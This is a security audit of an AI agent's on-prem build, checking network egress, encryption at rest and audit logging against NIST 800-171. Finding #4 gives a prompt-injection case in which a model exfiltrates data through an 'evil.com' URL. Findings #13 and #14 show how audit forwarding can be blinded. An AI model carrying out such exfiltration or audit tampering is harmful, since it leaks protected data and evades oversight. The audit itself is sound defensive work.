# WarMachine On-Prem Build — CUI Acceptability Audit

**Date:** 2026-09-28
**Scope:** `onprem` cargo feature (`warmachine`, `goose-providers`, `goose-cli`), repo `devinplauche/warmachine`
**Bar:** NIST SP 800-171 (Protecting CUI in Nonfederal Systems)
**Method:** Adversarial code review — three parallel tracks (network egress, data at rest, audit logging) plus direct verification of the crypto/TLS layer. Every finding cites file:line.

## Verdict: NOT YET ACCEPTABLE — but the foundations are real

The core mechanisms are genuinely well-built: the origin-based network allowlist is sound, AES-256-GCM session sealing is fail-closed, the OS keychain is mandatory, FIPS 140-3 refuses to start without the validated provider, and session retention cannot be disabled. None of the findings below are architectural — they are gaps in coverage around a solid core. With the must-fix list addressed, this build would clear a CUI bar.

## Must-fix findings

### Egress (can CUI leave the enclave?)

1. **OSV malware check exfiltrates automatically — CONFIRMED HOLE.**
   `crates/goose/src/agents/extension_malware_check.rs:486` (via `extension_manager/stdio.rs:21`) POSTs package name/ecosystem/version to `https://api.osv.dev/v1/query` on **every** stdio MCP extension addition. No `#[cfg(onprem)]` gate, no `check_url_allowed`, no user approval. This directly contradicts "laptops talk ONLY to an internal LLM server." Fix: `#[cfg(not(feature = "onprem"))]` the network call (it already fails open on network error, so on-prem behavior is unchanged) or route it through `check_url_allowed`.

2. **OTLP endpoint ungated — ONPREM.md claim is wrong.**
   `crates/goose/src/otel/otlp.rs:300` takes the export endpoint from env/config with zero allowlist validation. ONPREM.md says "OTLP layers are compiled out," but the `otel` feature is orthogonal to `onprem` (CI enables both). Traces can contain prompts. Fix: gate the endpoint with `check_url_allowed` under onprem, or correct the doc.

3. **Audit SIEM sink URL never validated.**
   `crates/goose/src/onprem.rs:504` (`forward_audit_log`) POSTs to the baked-in `WARMACHINE_ONPREM_AUDIT_SINK_URL` without checking it against `allowed_origins()` and without requiring https — a build-time typo silently ships metadata to the wrong host. Fix: validate sink against the allowlist at startup, fail closed on mismatch.

4. **`read_image` URL fetch is approval-gated but not network-gated.**
   `crates/goose/src/agents/platform_extensions/developer/image.rs:186` (`load_url_bytes`) fetches arbitrary URLs. A prompt-injected model can craft `https://evil.com/?d=<CUI>` and a single user approval exfiltrates via URL/DNS/SNI. Fix: `check_url_allowed` on the URL under onprem.

5. **Cloud dictation defaults to public APIs.**
   `crates/goose/src/dictation/providers.rs:62,72,82` default to `api.openai.com`, `api.groq.com`, `api.elevenlabs.io` with no onprem gate; spoken CUI would POST to public STT. Fix: fail closed under onprem (same pattern as Nostr).

6. **Telegram gateway ships ungated.**
   `crates/goose/src/gateway/telegram.rs:13` hardcodes `https://api.telegram.org`. Reachable via `warmachine gateway start telegram` (user-initiated, model can't start it without shell — lower severity). Fix: `#[cfg(not(feature = "onprem"))]` on the gateway module or `check_url_allowed` on the API base.

### Data at rest (is CUI protected on the laptop?)

7. **Session titles stored in plaintext — largest at-rest hole.**
   `crates/goose/src/session/session_manager.rs:661`, `session_naming.rs:89-137`: after ≤3 user messages, message text is sent for titling and the result lands in the plaintext `sessions.name` column. CUI in prompts (project names, ticket IDs, person names) rests unencrypted in `sessions.db`. Fix: seal the column or disable LLM titling under onprem.

8. **Recipe parameters and working dir in plaintext.**
   `sessions.user_recipe_values_json` (schema ~session_manager.rs:1054, `HashMap<String,String>`) and `sessions.working_dir` (schema :1043, reveals usernames/program names via paths) rest unsealed. Fix: seal both columns.

9. **Purge leaves recoverable data in SQLite free pages.**
   `purge_expired_sessions` does hard `DELETE`s (session_manager.rs:2442-2450) but never `VACUUM`s — deleted CUI persists in freelist/WAL pages until overwritten. Fix: `VACUUM` after purge batches (or `secure_delete=on` pragma).

10. **`audit.log` has no permission hardening.**
    `crates/goose/src/onprem.rs:215` — `OpenOptions::create(true).append(true)` with no `.mode()`, so the log inherits umask (typically 0644, world-readable). Holds session IDs, endpoints, extension names, request hashes. Fix: `0o600`, config dir `0o700`.

### Audit logging (NIST 800-171 3.3.x)

11. **Tool calls and approval decisions are not audited at all.**
    `crates/goose/src/agents/tool_execution.rs` has zero audit hooks. The actions that actually touch CUI (file reads/writes, web fetches) leave no trail — only the model request is logged. Largest 3.3.1 completeness gap. Fix: audit-hook tool execution with allow/deny decisions.

12. **Best-effort writes silently drop entries.**
    Audit calls are `let _ = ...` at 4 call sites (session_manager.rs:1671, 2423, 2458; extension_manager/mod.rs:623); only `reply_parts.rs:416` warns. Disk-full or permission failure = invisible audit loss, no counter, no alert. Fix: alert on failure; consider fail-closed option for 3.3.8.

13. **SIEM cursor tampering silently suppresses forwarding.**
    `onprem.rs:440-488`: if the cursor hash isn't found in the log (deleted/tampered cursor), the forwarder anchors at end-of-log and skips all unforwarded entries — by design, to avoid duplicates. An attacker who can write `audit.forward.cursor` blinds the SIEM with zero local evidence. Fix: integrity-protect the cursor (or forward-before-acknowledge semantics).

14. **Chain is rewritable by any local writer.**
    No external anchor (signed checkpoint, published hash) — tamper-evidence holds only against comparison with the SIEM copy. Combined with #10/#13, a user-level attacker owns the trail. Fix: periodic signed checkpoints or hash publication.

15. **Security-relevant events unlogged.**
    Extension removal/disable (only `extension_added` logged), session export, config changes, keychain/auth failures, `audit verify` runs. A malicious MCP server can be added, used, removed — log shows only half the story.

16. **No rotation; unbounded growth.**
    No rotation, archival, or size cap on `audit.log` — feeds #12 (disk exhaustion → silent audit loss).

## Weaknesses (lower severity)

- **TOCTOU chain fork on concurrent appends** (`last_entry_hash` → `append_entry` race, onprem.rs:198-226): two concurrent CLI processes can fork the chain; second entry then fails `verify`. Reachable in normal multi-process use. Fix: file locking.
- **No clock monotonicity check** (onprem.rs:228-230): backdated entries insertable with chain rewrite; no invariant in write path or verifier.
- **Forwarder is CLI-only** (goose-cli/src/main.rs:28): desktop-driven sessions accumulate locally but never forward.
- **`threads`/`thread_messages` tables outside purge coverage** — dead schema today (no writers), but any future writer silently escapes retention.
- **DEK not zeroized in memory** (onprem.rs `session_dek`): core dump / swap could disclose it. Minor.
- **Log files unhardened** (`~/.local/state/warmachine/logs/`, default umask): acceptable today only because nothing logs content — one future `debug!` with a prompt lands CUI world-readable.
- **Legacy plaintext rows** re-seal on next write; a pre-sealing laptop image keeps historic plaintext indefinitely. Acceptable migration tradeoff — note for deployment guide.
- **`request_sha256` dictionary attack assessed: not feasible.** Preimage is the full serialized request JSON, not a guessable value.

## Verified solid (no action)

- **Allowlist construction** (`goose-providers/src/onprem.rs`): origin-based (scheme+host+port), https enforced for non-loopback, case-normalized, build-time baked. Egress sandbox tests in CI cover bypass attempts.
- **FIPS 140-3**: `init_fips_crypto()` + `is_fips_provider_active()` fail-closed in `main.rs:51-58`; version pin enforced in CI; runtime self-test exists.
- **TLS**: no `danger_accept_invalid_certs` or null verifiers anywhere; sink TLS uses the FIPS provider.
- **Sealing**: AES-256-GCM, fresh 96-bit nonce per message, all 4 write paths fail-closed; GCM integrity on read.
- **Keychain**: `WARMACHINE_DISABLE_KEYRING` ignored under onprem; `secrets.yaml` unreachable; unreachable keychain fails closed.
- **Session DB dir**: `0o700` enforced on creation and re-secured on open.
- **Retention**: 0/unparsable fails closed; hard DELETEs; `sessions_purged` audit event.
- **Nostr / PostHog / Langfuse / StreamableHttp / ApiClient**: correctly gated or compiled out. No raw-socket egress, no recipe-from-URL, no update phone-home, no DoH.
- **`WARMACHINE_ONPREM_EXTRA_HOSTS`**: sound build-time escape hatch (not runtime-configurable).
- **Audit chain construction** itself is correct (`verify_audit_log` faithfully checks linkage + recomputation); `request_sha256`-only logging is the right CUI posture (no content duplication in the log).

## Suggested fix order

Batch 1 (exfil + plaintext CUI): #1 (OSV), #7 (session titles), #8 (recipe values/working dir), #4 (read_image), #5 (dictation).
Batch 2 (audit trail integrity): #11 (tool hooks), #12 (write-failure alerting), #13 (cursor integrity), #10 (0600), #9 (VACUUM).
Batch 3 (hardening + docs): #2 (OTLP), #3 (sink validation), #6 (telegram), #14 (checkpoints), #15 (missing events), #16 (rotation), TOCTOU lock.
